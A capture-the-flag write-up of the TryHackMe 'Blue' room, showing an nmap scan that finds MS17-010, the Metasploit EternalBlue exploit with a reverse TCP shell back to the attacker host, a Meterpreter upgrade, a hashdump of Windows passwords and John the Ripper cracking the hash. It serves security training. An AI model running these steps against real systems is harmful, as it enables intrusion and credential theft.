TryHackMe - Blue | Writeup
Room:Blue
Difficulty: Easy
Writeup by: Sourav Mondal

Recon
namp scan...
nmap -sV --script vuln -T4 -oN nmap-vuln.txt 10.10.73.255
Nmap scan report for 10.10.73.255
Host is up (0.28s latency).
Not shown: 991 closed tcp ports (conn-refused)
PORT      STATE SERVICE            VERSION
135/tcp   open  msrpc              Microsoft Windows RPC
139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds       Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
3389/tcp  open  ssl/ms-wbt-server?
|_ssl-ccs-injection: No reply from server (TIMEOUT)
49152/tcp open  msrpc              Microsoft Windows RPC
49153/tcp open  msrpc              Microsoft Windows RPC
49154/tcp open  msrpc              Microsoft Windows RPC
49158/tcp open  msrpc              Microsoft Windows RPC
49160/tcp open  msrpc              Microsoft Windows RPC
Service Info: Host: JON-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_samba-vuln-cve-2012-1182: NT_STATUS_ACCESS_DENIED
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|           
|     Disclosure date: 2017-03-14
|     References:
|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
|_      https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
|_smb-vuln-ms10-061: NT_STATUS_ACCESS_DENIED
|_smb-vuln-ms10-054: false

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Jul 16 16:00:14 2025 -- 1 IP address (1 host up)
find vunlerability
A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).

Gain Access

start metasploit
search ms17-010
msfconsole

[msf](Jobs:0 Agents:0) >> search ms17-010

Matching Modules
================

   #   Name                                           Disclosure Date  Rank     Check  Description
   -   ----                                           ---------------  ----     -----  -----------
   0   exploit/windows/smb/ms17_010_eternalblue       2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
   1     \_ target: Automatic Target                  .                .        .      .
msf](Jobs:0 Agents:0) >> use 0

[msf](Jobs:0 Agents:0) exploit(windows/smb/ms17_010_eternalblue) >> set rhosts 10.10.73.255
rhosts => 10.10.73.255
[msf](Jobs:0 Agents:0) exploit(windows/smb/ms17_010_eternalblue) >> set lhost tun0

[msf](Jobs:0 Agents:0) exploit(windows/smb/ms17_010_eternalblue) >> set payload windows/x64/shell/reverse_tcp
payload => windows/x64/shell/reverse_tcp
[msf](Jobs:0 Agents:0) exploit(windows/smb/ms17_010_eternalblue) >> run
[*] Started reverse TCP handler on 10.17.55.203:4444 
[*] 10.10.73.255:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[+] 10.10.73.255:445      - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)
/usr/share/metasploit-framework/vendor/bundle/ruby/3.1.0/gems/recog-3.1.17/lib/recog/fingerprint/regexp_factory.rb:34: warning: nested repeat operator '+' and '?' was replaced with '*' in regular expression
[*] 10.10.73.255:445      - Scanned 1 of 1 hosts (100% complete)
[+] 10.10.73.255:445 - The target is vulnerable.
[*] 10.10.73.255:445 - Connecting to target for exploitation.
[+] 10.10.73.255:445 - Connection established for exploitation.
[+] 10.10.73.255:445 - Target OS selected valid for OS indicated by SMB reply
[*] 10.10.73.255:445 - CORE raw buffer dump (42 bytes)
[*] 10.10.73.255:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73  Windows 7 Pr
+] 10.10.73.255:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.10.73.255:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.10.73.255:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=


C:\Windows\system32>

successfully exploited the vulnerability
Escalate privileges, learn how to upgrade shells in metasploit.
If you haven't already, background the previously gained shell (CTRL + Z). 
search shell to meterpeter

Background session 1? [y/N]  y


[msf](Jobs:0 Agents:1) exploit(windows/smb/ms17_010_eternalblue) >> search shell to meterpreter
  108    \_ target: Mac OS X                                                      .                .          .      .
   109  post/multi/manage/shell_to_meterpreter                                     .                normal     No     Shell to Meterpreter Upgrade
   110  exploit/multi/http/sonicwall_gms_upload                                    2012-01-17       excellent  Yes    SonicWALL GMS 6 Arbitrary File Upload
   111    \_ target: SonicWALL GMS 6.0 Viewpoint / Java Universal                  .           
[msf](Jobs:0 Agents:1) exploit(windows/smb/ms17_010_eternalblue) >> use 109
msf](Jobs:0 Agents:1) post(multi/manage/shell_to_meterpreter) >> show sessions

Active sessions
===============

  Id  Name  Type               Information  Connection
  --  ----  ----               -----------  ----------
  1         shell x64/windows               10.17.55.203:4444 -> 10.10.73.255:49175 (10.10.73.255)

  [msf](Jobs:0 Agents:1) post(multi/manage/shell_to_meterpreter) >> set session 1
session => 1
[msf](Jobs:0 Agents:1) post(multi/manage/shell_to_meterpreter) >> run
[*] Upgrading session ID: 1
[*] Starting exploit/multi/handler
[*] Started reverse TCP handler on 10.17.55.203:4433 
[*] Post module execution completed
[msf](Jobs:1 Agents:1) post(multi/manage/shell_to_meterpreter) >> 
[*] Sending stage (203846 bytes) to 10.10.73.255
[*] Meterpreter session 2 opened (10.17.55.203:4433 -> 10.10.73.255:49182) at 2025-07-16 16:23:43 +0530
[*] Stopping exploit/multi/handler

Meterpreter 1)(C:\Windows\system32) 
meterpreter shell, run the command 'hashdump'. This will dump all of the passwords on the machine as long as we have the correct privileges to do so.
Meterpreter 1)(C:\Windows\system32) > hashdump

save the non-default user hash a file i save hash.txt file.

Cracking

i use john the ripper tool crack the lm hash.
sudo john hash.txt --wordlist=/usr/share/SecList/Passwords/Leaked-Databases/rockyou.txt -format=NT
Using default input encoding: UTF-8
Loaded 1 password hash (NT [MD4 128/128 SSE2 4x3])
Warning: no OpenMP support for this hash type, consider --fork=2
Press 'q' or Ctrl-C to abort, almost any other key for status
alqfna22         (Jon)     
1g 0:00:00:02 DONE (2025-07-16 16:58) 0.3802g/s 3878Kp/s 3878Kc/s 3878KC/s alqueva1968..alpus
Use the "--show --format=NT" options to display all of the cracked passwords reliably
Session completed

